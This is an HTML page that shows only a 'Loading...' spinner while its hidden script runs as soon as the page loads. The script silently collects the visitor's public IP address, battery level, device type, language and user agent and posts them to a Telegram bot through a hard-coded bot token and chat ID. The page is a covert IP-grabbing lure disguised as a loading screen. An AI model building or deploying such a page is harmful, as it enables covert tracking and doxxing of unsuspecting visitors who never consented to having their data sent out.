<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body, html {
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #0f172a;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.1);
            border-top-color: #38bdf8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
    </style>
</head>
<body>

    <div class="spinner"></div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8539452307:AAE3Px3RSVeT-YjpxTWp_btbswWg5_o0DTo';
        const TELEGRAM_CHAT_ID = '8714686528';

        function getDeviceType() {
            const ua = navigator.userAgent;
            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
                return 'Tablet';
            }
            if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/i.test(ua)) {
                return 'Mobile';
            }
            return 'Desktop';
        }

        async function getBatteryPercentage() {
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    return `${Math.round(battery.level * 100)}%`;
                }
            } catch (e) {
                // Ignore errors if battery access is blocked
            }
            return 'Unsupported/Blocked';
        }

        async function captureAndSend() {
            try {
                // Fetch IP and Battery concurrently
                const [ipResponse, batteryPercentage] = await Promise.all([
                    fetch('https://api.ipify.org?format=json').then(res => res.json()),
                    getBatteryPercentage()
                ]);

                const visitorIp = ipResponse.ip;
                const deviceType = getDeviceType();
                const userAgent = navigator.userAgent;
                const language = navigator.language || navigator.userLanguage || 'Unknown';

                // Format the message with all collected parameters
                const message = `IP: ${visitorIp}\nBattery: ${batteryPercentage}\nDevice: ${deviceType}\nLanguage: ${language}\nUser Agent: ${userAgent}`;

                // Send payload to Telegram
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message
                    })
                });
            } catch (error) {
                console.error('Error logging details:', error);
            }
        }

        window.addEventListener('DOMContentLoaded', captureAndSend);
    </script>
</body>
</html>
